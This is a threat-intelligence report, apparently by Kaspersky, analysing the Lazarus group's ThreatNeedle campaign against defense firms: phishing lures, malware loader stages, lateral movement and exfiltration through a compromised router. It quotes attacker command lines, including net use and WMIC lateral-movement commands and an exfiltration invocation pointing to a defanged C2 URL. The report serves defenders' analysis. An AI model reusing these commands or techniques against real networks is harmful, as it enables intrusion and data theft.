We’ve observed numerous activities by\nthis notorious APT group targeting various industries. The group has changed target\ndepending on the primary objective. Google TAG [has recently published a post about a](https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/)\ncampaign by Lazarus targeting security researchers. After taking a closer look, we identified\nthe malware used in those attacks as belonging to a family that we call ThreatNeedle. We\nhave seen Lazarus attack various industries using this malware cluster before. In mid-2020,\nwe realized that Lazarus was launching attacks on the defense industry using the\n\n\n-----\n\nThreatNeedle cluster, an advanced malware cluster of Manuscrypt (a.k.a. NukeSped). While\ninvestigating this activity, we were able to observe the complete life cycle of an attack,\nuncovering more technical details and links to the group’s other campaigns.\n\nThe group made use of COVID-19 themes in its spear-phishing emails, embellishing them\nwith personal information gathered using publicly available sources. After gaining an initial\nfoothold, the attackers gathered credentials and moved laterally, seeking crucial assets in the\nvictim environment. We observed how they overcame network segmentation by gaining\naccess to an internal router machine and configuring it as a proxy server, allowing them to\nexfiltrate stolen data from the intranet network to their remote server. So far organizations in\nmore than a dozen countries have been affected.\n\nDuring this investigation we had a chance to look into the command-and-control\ninfrastructure. The attackers configured multiple C2 servers for various stages, reusing\nseveral scripts we’ve seen in previous attacks by the group. Moreover, based on the insights\nso far, it was possible to figure out the relationship with other Lazarus group campaigns.\n\n[The full article is available on Kaspersky Threat Intelligence. Customers of Kaspersky](https://www.kaspersky.com/enterprise-security/threat-intelligence)\n[Intelligence reporting may contact: intelreports@kaspersky.com](http://10.10.0.46/mailto:intelreports@kaspersky.com)\n[For more information please contact: ics-cert@kaspersky.com](http://10.10.0.46/mailto:ics-cert@kaspersky.com)\n\n## Initial infection\n\nIn this attack, spear phishing was used as the initial infection vector. Before launching the\nattack, the group studied publicly available information about the targeted organization and\nidentified email addresses belonging to various departments of the company.\n\nEmail addresses in those departments received phishing emails that either had a malicious\nWord document attached or a link to one hosted on a remote server. The phishing emails\nclaimed to have urgent updates on today’s hottest topic – COVID-19 infections. The phishing\nemails were carefully crafted and written on behalf of a medical center that is part of the\norganization under attack.\n\n\n-----\n\n**_Phishing email with links to malicious documents_**\n\nThe attackers registered accounts with a public email service, making sure the sender’s\nemail addresses looked similar to the medical center’s real email address. The signature\nshown in the phishing emails included the actual personal data of the deputy head doctor of\nthe attacked organization’s medical center. The attackers were able to find this information\non the medical center’s public website.\n\nA macro in the Microsoft Word document contained the malicious code designed to\ndownload and execute additional malicious software on the infected system.\n\nThe document contains information on the population health assessment program and is not\ndirectly related to the subject of the phishing email (COVID-19), suggesting the attackers\nmay not completely understand the meaning of the contents they used.\n\n\n-----\n\n**_Contents of malicious document_**\n\nThe content of the lure document was copied from an online post by a health clinic.\n\nOur investigation showed that the initial spear-phishing attempt was unsuccessful due to\nmacros being disabled in the Microsoft Office installation of the targeted systems. In order to\npersuade the target to allow the malicious macro, the attacker sent another email showing\nhow to enable macros in Microsoft Office.\n\n\n-----\n\n**_Email with instructions on enabling macros #1_**\n\nAfter sending the above email with explanations, the attackers realized that the target was\nusing a different version of Microsoft Office and therefore required a different procedure for\nenabling macros. The attackers subsequently sent another email showing the correct\nprocedure in a screenshot with a Russian language pack.\n\n\n-----\n\n**_Email with instructions on enabling macros #2_**\n\nThe content in the spear-phishing emails sent by the attackers from May 21 to May 26, 2020,\ndid not contain any grammatical mistakes. However, in subsequent emails the attackers\nmade numerous errors, suggesting they may not be native Russian speakers and were using\ntranslation tools.\n\n\n-----\n\n**_Email containing several grammatical mistakes_**\n\nOn June 3, 2020, one of the malicious attachments was opened by employees and at 9:30\nam local time the attackers gained remote control of the infected system.\n\nThis group also utilized different types of spear-phishing attack. One of the compromised\nhosts received several spear-phishing documents on May 19, 2020. The malicious file that\nwas delivered, named Boeing_AERO_GS.docx, fetches a template from a remote server.\n\nHowever, no payload created by this malicious document could be discovered. We speculate\nthat the infection from this malicious document failed for a reason unknown to us. A few days\nlater, the same host opened a different malicious document. The threat actor wiped these\nfiles from disk after the initial infection meaning they could not be obtained.\n\nNonetheless, a related malicious document with this malware was retrieved based on our\ntelemetry. It creates a payload and shortcut file and then continues executing the payload by\nusing the following command line parameters.\n\nPayload path: %APPDATA%\\Microsoft\\Windows\\lconcaches.db\nShortcut path: %APPDATA%\\Microsoft\\Windows\\Start\nMenu\\Programs\\Startup\\OneDrives.lnk\nCommand Line; please note that the string at the end is hard-coded, but different for\neach sample:\nexe [dllpath],Dispatch n2UmQ9McxUds2b29\n\nThe content of the decoy document depicts the job description of a generator/power industry\nengineer.\n\n\n-----\n\n**_Decoy document_**\n\n## Malware implants\n\nUpon opening a malicious document and allowing the macro, the malware is dropped and\nproceeds to a multistage deployment procedure. The malware used in this campaign\nbelongs to a known malware cluster we named ThreatNeedle. We attribute this malware\nfamily to the advanced version of Manuscrypt (a.k.a. NukeSped), a family belonging to the\nLazarus group. We previously observed the Lazarus group utilizing this cluster when\nattacking cryptocurrency businesses and a mobile game company. Although the malware\ninvolved and the entire infection process is known and has not changed dramatically\ncompared to previous findings, the Lazarus group continued using ThreatNeedle malware\naggressively in this campaign.\n\n\n-----\n\n**_Infection procedure_**\n\nThe payload created by the initial spear-phishing document loads the next stage as a\nbackdoor running in-memory – the ThreatNeedle backdoor. ThreatNeedle offers functionality\nto control infected victims. The actor uses it to carry out initial reconnaissance and deploy\nadditional malware for lateral movement. When moving laterally, the actor uses\nThreatNeedle installer-type malware in the process. This installer is responsible for\nimplanting the next stage loader-type malware and registering it for auto-execution in order\nto achieve persistence. The ThreatNeedle loader-type malware exists in several variations\nand serves the primary purpose of loading the final stage of the ThreatNeedle malware inmemory.\n\n### ThreatNeedle installer\n\nUpon launch, the malware decrypts an embedded string using RC4 (key: B6 B7 2D 8C 6B\n5F 14 DF B1 38 A1 73 89 C1 D2 C4) and compares it to “7486513879852“. If the user\nexecutes this malware without a command line parameter, the malware launches a legitimate\ncalculator carrying a dark icon of the popular Avengers franchise.\n\nFurther into the infection process, the malware chooses a service name randomly from\nnetsvc in order to use it for the payload creation path. The malware then creates a file named\nbcdbootinfo.tlp in the system folder containing the infection time and the random service\nname that is chosen. We’ve discovered that the malware operator checks this file to see\nwhether the remote host was infected and, if so, when the infection happened.\n\nIt then decrypts the embedded payload using the RC4 algorithm, saves it to an .xml\nextension with a randomly created five-character file name in the current directory and then\ncopies it to the system folder with a .sys extension.\n\nThis final payload is the ThreatNeedle loader running in memory. At this point the loader\nuses a different RC4 key (3D 68 D0 0A B1 0E C6 AF DD EE 18 8E F4 A1 D6 20), and the\ndropped malware is registered as a Windows service and launched. In addition, the malware\nsaves the configuration data as a registry key encrypted in RC4:\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameConfig – Description\n\n### ThreatNeedle loader\n\nThis component is responsible for loading the final backdoor payload into memory. In order\nto do this, the malware uses several techniques to decrypt its payload:\n\nLoading the payload from the registry.\nLoading the payload from itself after decrypting RC4 and decompression.\nLoading the payload from itself after decrypting AES and decompression.\nLoading the payload from itself after decompression.\n\n\n-----\n\nLoading the payload from itself after one-byte XORing.\n\nMost loader-style malware types check the command line parameter and only proceed with\nthe malicious routine if an expected parameter is given. This is a common trait in\nThreatNeedle loaders. The most common example we’ve seen is similar to the ThreatNeedle\ninstaller – the malware decrypts an embedded string using RC4, and compares it with the\nparameter “Sx6BrUk4v4rqBFBV” upon launch. If it matches, the malware begins decrypting\nits embedded payload using the same RC4 key. The decrypted payload is an archive file\nwhich is subsequently decompressed in the process. Eventually, the ThreatNeedle malware\nspawns in memory.\n\nThe other variant of the loader is preparing the next stage payload from the victim’s registry.\nAs we can see from the installer malware description, we suspect that the registry key was\ncreated by the installer component. Retrieved data from the registry is decrypted using RC4\nand then decompressed. Eventually, it gets loaded into memory and the export function is\ninvoked.\n\n### ThreatNeedle backdoor\n\nThe final payload executed in memory is the actual ThreatNeedle backdoor. It has the\nfollowing functionality to control infected victim machines:\n\nManipulate files/directories\nSystem profiling\nControl backdoor processes\nEnter sleeping or hibernation mode\nUpdate backdoor configuration\nExecute received commands\n\n## Post-exploitation phase\n\nFrom one of the hosts, we discovered that the actor executed a credential harvesting tool\nnamed [Responder and moved laterally using Windows commands. Lazarus overcame](https://github.com/lgandx/Responder/)\nnetwork segmentation, exfiltrating data from a completely isolated network segment cut off\nfrom the internet by compromising a router virtual machine, as we explain below under\n_“Overcoming network segmentation“._\n\nJudging by the hosts that were infected with the ThreatNeedle backdoors post-exploitation,\nwe speculate that the primary intention of this attack is to steal intellectual property. Lastly,\nthe stolen data gets exfiltrated using a custom tool that will be described in the “Exfiltration”\nsection. Below is a rough timeline of the compromise we investigated:\n\n\n-----\n\n**_Timeline of infected hosts_**\n\n### Credential gathering\n\nDuring the investigation we discovered that the Responder tool was executed from one of\nthe victim machines that had received the spear-phishing document. One day after the initial\ninfection, the malware operator placed the tool onto this host and executed it using the\nfollowing command:\n\n[Responder file path] -i [IP address] -rPv\n\nSeveral days later, the attacker started to move laterally originating from this host. Therefore,\nwe assess that the attacker succeeded in acquiring login credentials from this host and\nstarted using them for further malicious activity.\n\n### Lateral movement\n\nAfter acquiring the login credentials, the actor started to move laterally from workstations to\nserver hosts. Typical lateral movement methods were employed, using Windows commands.\nFirst, a network connection with a remote host was established using the command “net\nuse”.\n\nnet use \\\\[IP address]\\IPC$ “[password]” /u:”[user name]” > $temp\\~tmp5936t.tmp\n2>&1″\n\nNext, the actor copied malware to the remote host using the Windows Management\nInstrumentation Command-line (WMIC).\n\n\n-----\n\nexe /node:[IP address] /user: [user name] /password: [password] PROCESS CALL\nCREATE “cmd.exe /c $appdata\\Adobe\\adobe.bat“\nexe /node:[IP address] /user:”[user name]” /password:”[password]” PROCESS CALL\nCREATE “cmd /c sc queryex helpsvc > $temp\\tmp001.dat“\n\n### Overcoming network segmentation\n\nIn the course of this research, we identified another highly interesting technique used by the\nattackers for lateral movement and exfiltration of stolen data. The enterprise network under\nattack was divided into two segments: corporate (a network on which computers had internet\naccess) and restricted (a network on which computers hosted sensitive data and had no\ninternet access). According to corporate policies, no transfer of information was allowed\nbetween these two segments. In other words, the two segments were meant to be\ncompletely separated.\n\nInitially, the attackers were able to get access to systems with internet access and spent a\nlong time distributing malware between machines in the network’s corporate segment.\nAmong the compromised machines were those used by the administrators of the enterprise’s\nIT infrastructure.\n\nIt is worth noting that the administrators could connect both to the corporate and the\nrestricted network segments to maintain systems and provide users with technical support in\nboth zones. As a result, by gaining control of administrator workstations the attackers were\nable to access the restricted network segment.\n\nHowever, since directly routing traffic between the segments was not possible, the attackers\ncouldn’t use their standard malware set to exfiltrate data from the restricted segment to the\nC2.\n\nThe situation changed on July 2 when the attackers managed to obtain the credentials for\nthe router used by the administrators to connect to systems in both segments. The router\nwas a virtual machine running CentOS to route traffic between several network interfaces\nbased on predefined rules.\n\n\n-----\n\n**_Connection layout between victim’s network segments_**\n\nAccording to the evidence collected, the attackers scanned the router’s ports and detected a\n[Webmin interface. Next, the attackers logged in to the web interface using a privileged root](https://www.webmin.com/)\naccount. It’s unknown how the attackers were able to obtain the credentials for that account,\nbut it’s possible the credentials were saved in one of the infected system’s browser password\nmanagers.\n\n**_Log listing Webmin web interface logins_**\n\nBy gaining access to the configuration panel the attackers configured the Apache web server\nand started using the router as a proxy server between the organization’s corporate and\nrestricted segments.\n\n\n-----\n\n**_List of services used on the router_**\n\nSeveral days after that, on July 10, 2020, the attackers connected to the router via SSH and\nset up the PuTTy [PSCP (the PuTTY Secure Copy client) utility on one of the infected](https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter5.html)\nmachines. This utility was used to upload malware to the router VM. This enabled the\nattackers to place malware onto systems in the restricted segment of the enterprise network,\nusing the router to host the samples. In addition, malware running in the network’s restricted\nsegment was able to exfiltrate the collected data to the command-and-control server via the\nApache server set up on the same router.\n\n**_New connection layout after attacker’s intrusion_**\n\nIn the course of the investigation we identified malware samples with the hardcoded URL of\nthe router used as a proxy server.\n\n**_Hardcoded proxy address in the malware_**\n\nSince the attackers regularly deleted log files from the router, only a handful of commands\nentered to the command line via SSH could be recovered. An analysis of these commands\nshows that the attackers tried to reconfigure traffic routing using the route command.\n\n\n-----\n\n**_Attacker commands_**\n\nThe attackers also ran the nmap utility on the router VM and scanned ports on systems\nwithin the restricted segment of the enterprise network. On September 27, the attackers\nstarted removing all traces of their activity from the router, using the logrotate utility to set up\nautomatic deletion of log files.\n\n**_Webmin log_**\n\n### Exfiltration\n\nWe observed that the malware operator attempted to create SSH tunnels to a remote server\nlocated in South Korea from several compromised server hosts. They used a custom\ntunneling tool to achieve this. The tool receives four parameters: client IP address, client\nport, server IP address and server port. The tool offers basic functionality, forwarding client\ntraffic to the server. In order to create a covert channel, the malware encrypts forwarded\ntraffic using trivial binary encryption.\n\n**_Encryption routine_**\n\n\n-----\n\nUsing the covert channel, the adversary copied data from the remote server over to the host\nusing the PuTTy PSCP tool:\n\n%APPDATA%\\PBL\\unpack.tmp -pw [password] root@[IP address]:/tmp/cab0215\n%APPDATA%\\PBL\\cab0215.tmp\n\nAfter copying data from the server, the actor utilized the custom tool to exfiltrate stolen data\nto the remote server. This malware looks like a legitimate VNC client and runs like one if it’s\nexecuted without any command line parameters.\n\n**_Execution of malware without parameters_**\n\nHowever, if this application is executed with specific command line parameters, it runs an\nalternate, malicious function. According to our telemetry, the actor executed this application\nwith six parameters:\n\n_%APPDATA%\\Comms\\Comms.dat S0RMM-50QQE-F65DN-DCPYN-5QEQA_\n_hxxps://www.gonnelli[.]it/uploads/catalogo/thumbs/thumb[.]asp_\n_%APPDATA%\\Comms\\cab59.tmp FL0509 15000_\n\n\n-----\n\nAlso, if the number of command line parameters is greater than six, the malware jumps into a\nmalicious routine. The malware also checks the length of the second argument – if it’s less\nthan 29 characters, it terminates the execution. When the parameter checking procedure has\npassed successfully, the malware starts to decrypt its next payload.\n\nThe embedded payload gets decrypted via XOR, where each byte from the end of the\npayload gets applied to the preceding byte. Next, the XORed blob receives the second\ncommand line argument that’s provided (in this case S0RMM-50QQE-F65DN-DCPYN5QEQA). The malware can accept more command line arguments, and depending on its\nnumber it runs differently. For example, it can also receive proxy server addresses with the “p” option.\n\nWhen the decrypted in-memory payload is executed, it compares the header of the\nconfiguration data passed with the string “0x8406” in order to confirm its validity. The payload\nopens a given file (in this example %APPDATA%\\Comms\\cab59.tmp) and starts exfiltrating it\nto the remote server. When the malware uploads data to the C2 server, it uses HTTP POST\nrequests with two parameters named ‘fr’ and ‘fp’:\n\nThe ‘fr’ parameter contains the file name from the command line argument to upload.\nThe ‘fp’ parameter contains the base64 encoded size, CRC32 value of content and file\ncontents.\n\n**_Contents of fp parameter_**\n\n## Attribution\n\nWe have been tracking ThreatNeedle malware for more than two years and are highly\nconfident that this malware cluster is attributed only to the Lazarus group. During this\ninvestigation, we were able to find connections to several clusters of the Lazarus group.\n\n\n-----\n\n**_Connections between Lazarus campaigns_**\n\n### Connection with DeathNote cluster\n\nDuring this investigation we identified several connections with the DeathNote (a.k.a.\n[Operation Dream Job) cluster of the Lazarus group. First of all, among the hosts infected by](https://www.clearskysec.com/operation-dream-job/)\nthe ThreatNeedle malware, we discovered one that was also infected with the DeathNote\nmalware, and both threats used the same C2 server URLs.\n\nIn addition, while analyzing the C2 server used in this attack, we found a custom web shell\nscript that was also discovered on the DeathNote C2 server. We also identified that the\nserver script corresponding to the Trojanized VNC Uploader was found on the DeathNote C2\nserver.\n\nAlthough DeathNote and this incident show different TTPs, both campaigns share command\nand control infrastructure and some victimology.\n\n### Connection with Operation AppleJeus\n\n[We also found a connection with Operation AppleJeus. As we described, the actor used a](https://securelist.com/operation-applejeus/87553/)\nhomemade tunneling tool in the ThreatNeedle campaign that has a custom encryption\nroutine to create a covert channel. This very same tool was utilized in operation AppleJeus\nas well.\n\n\n-----\n\n**_Same tunneling tool_**\n\n### Connection with Bookcode cluster\n\n[In our previous blog about Lazarus group, we mentioned the Bookcode cluster attributed to](https://securelist.com/lazarus-covets-covid-19-related-intelligence/99906/)\n[Lazarus group; and recently the Korea Internet and Security Agency (KISA) also published a](https://www.krcert.or.kr/data/reportView.do?bulletin_writing_sequence=35471)\nreport about the operation. In the report, they mentioned a malware cluster named LPEClient\nused for profiling hosts and fetching next stage payloads. While investigating this incident,\nwe also found LPEClient from the host infected with ThreatNeedle. So, we assess that the\nThreatNeedle cluster is connected to the Bookcode operation.\n\n## Conclusions\n\nIn recent years, the Lazarus group has focused on attacking financial institutions around the\nworld. However, beginning in early 2020, they focused on aggressively attacking the defense\nindustry. While Lazarus has also previously utilized the ThreatNeedle malware used in this\nattack when targeting cryptocurrency businesses, it is currently being actively used in\ncyberespionage attacks.\n\nThis investigation allowed us to create strong ties between multiple campaigns that Lazarus\nhas conducted, reinforcing our attribution. In this campaign the Lazarus group demonstrated\nits sophistication level and ability to circumvent the security measures they face during their\nattacks, such as network segmentation. We assess that Lazarus is a highly prolific group,\nconducting several campaigns using different strategies. They shared tools and\ninfrastructure among these campaigns to accomplish their goals.\n\n_Kaspersky ICS CERT would like to thank Vasily Berdnikov (Kaspersky targeted attacks_\n_research group) for
